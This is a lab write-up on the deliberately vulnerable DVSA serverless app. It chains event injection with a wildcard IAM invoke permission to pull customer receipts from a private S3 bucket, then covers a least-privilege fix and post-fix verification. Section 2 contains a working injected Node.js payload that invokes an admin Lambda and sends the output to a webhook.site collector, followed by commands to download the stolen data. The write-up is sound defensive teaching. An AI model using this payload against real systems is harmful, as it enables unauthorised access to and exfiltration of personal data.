# Security Analysis: Sensitive Information Disclosure in DVSA

This repository documents the discovery and remediation of a critical information disclosure vulnerability within a serverless architecture. By chaining an event injection flaw with over-privileged IAM permissions, an attacker can invoke internal administrative functions to exfiltrate private data—specifically, customer order receipts stored in a private Amazon S3 bucket.

---

## 1. Setup & Deployment
To replicate this analysis, you must deploy the DVSA environment on AWS.

1.  **Deployment:** Use the official DVSA deployment scripts (AWS SAM or CloudFormation) provided in the core repository.
2.  **Environment:** Ensure you have access to the AWS Management Console, specifically **IAM** and **Lambda**.
3.  **Target Endpoints:** Identify the `/Prod/order` public API Gateway endpoint.
4.  **Backend Verification:** Ensure the `DVSA-ADMIN-GET-RECEIPT` function exists and has a private S3 bucket populated with sample receipt files.

---

## 2. Vulnerability Replication 
### The Root Cause
The vulnerability stems from an over-privileged **IAM Execution Role**. The Lambda function handling public orders was granted `lambda:InvokeFunction` permissions on `*` (all resources). This allows an attacker to use an existing event injection flaw to programmatically call the internal `DVSA-ADMIN-GET-RECEIPT` function, which generates pre-signed S3 URLs for sensitive archives.

### Step-by-Step Exploitation
1.  **Setup Listener:** Open [Webhook.site](https://webhook.site) and copy your unique payload URL.
2.  **Intercept Request:** Use **Burp Suite Proxy** to intercept a standard POST request to the `/order` endpoint.
3.  **Inject Malicious Payload:** Replace the `action` value in the JSON body with a Node.js function designed to invoke the administrative function.

**Exploit Payload:**
```json
{
  "action": "$_SEND_FUNC$$;function(){const {LambdaClient,InvokeCommand}=require('@aws-sdk/client-lambda');const client=new LambdaClient({region:'us-east-1'});const cmd=new InvokeCommand({FunctionName:'DVSA-ADMIN-GET-RECEIPT',InvocationType:'RequestResponse',Payload:Buffer.from(JSON.stringify({user:'1','year':'2026','month':'04'}))});client.send(cmd).then(res=>{const payload=Buffer.from(res.Payload).toString();fetch('https://webhook.site/[YOUR_WEBHOOK_ID]?data='+payload)})}"
}
```

4.  **Send & Capture:** Forward the request. Check your Webhook.site dashboard for an incoming GET request containing Base64 encoded data.
5.  **Decode & Exfiltrate:**
    * Copy the Base64 string into **CyberChef** and use the "From Base64" recipe.
    * Identify the `download_url` for the `receipts.zip` file.
6.  **Access Private Data:**
    * Download the file: `curl -o receipts.zip "[DECODED_URL]"`
    * Unzip and view the contents: `unzip receipts.zip && cat receipt_01.txt`
    * **Result:** You now have unauthenticated access to full names, addresses, and order totals of other users.

> **[Insert Screenshot: Webhook capture showing Base64 response]**
> **[Insert Screenshot: Terminal output showing unzipped sensitive receipts]**

---

## 3. Remediation & Patching (Video 2)
### The Fix Strategy: Least Privilege
To neutralize this attack, the IAM policy for the Lambda execution role must be restricted. We replace the wildcard `*` resource with a scoped ARN that only allows the function to invoke necessary order-processing functions, explicitly excluding administrative tools.

### Technical Implementation
1.  **Navigate to IAM Console:** Find the execution role associated with the public order Lambda function.
2.  **Edit Policy:** Locate the statement granting `lambda:InvokeFunction`.
3.  **Apply Patch:** Replace the vulnerable policy with the restricted version.

**Vulnerable Policy Snippet:**
```json
{
  "Effect": "Allow",
  "Action": "lambda:InvokeFunction",
  "Resource": "*"
}
```

**Patched Policy (Secure):**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "lambda:InvokeFunction",
      "Resource": [
        "arn:aws:lambda:us-east-1:*:function:DVSA-ORDER-*"
      ]
    }
  ]
}
```
*Note: This policy uses a wildcard suffix to allow necessary checkouts while blocking the `DVSA-ADMIN-*` namespace.*

---

## 4. Verification After Fix
1.  **Re-run the Exploit:** Send the exact same malicious injection payload via Burp Suite.
2.  **Observe Failure:** Check the Webhook.site dashboard. **No data is received.**
3.  **Check Backend Logs:** AWS CloudWatch will show an `AccessDeniedException`, confirming that the IAM policy successfully blocked the unauthorized invocation.
4.  **Functional Check:** Perform a legitimate checkout on the DVSA frontend. The process should succeed, proving that "Least Privilege" does not break intended business logic.

> **[Insert Screenshot: Comparison of the original and restricted IAM policies side-by-side]**

---

## Security Analysis Summary

| Vulnerability | Why It Works | Post-Fix Verification |
| :--- | :--- | :--- |
| **Sensitive Info Disclosure** | Wildcard IAM permissions allowed a public entry point to "lateral move" into admin functions. | Stolen tokens/injected code return `AccessDenied` when calling administrative ARNs. |

---

## Takeaway & Lessons Learned
Trusting "internal" calls as inherently safe is a critical architectural flaw. In serverless environments, network proximity does not equal authorization. This project demonstrates that **Defense in Depth** must include strictly bounded IAM permissions at the resource level to contain the blast radius of code-level vulnerabilities like event injection.

---
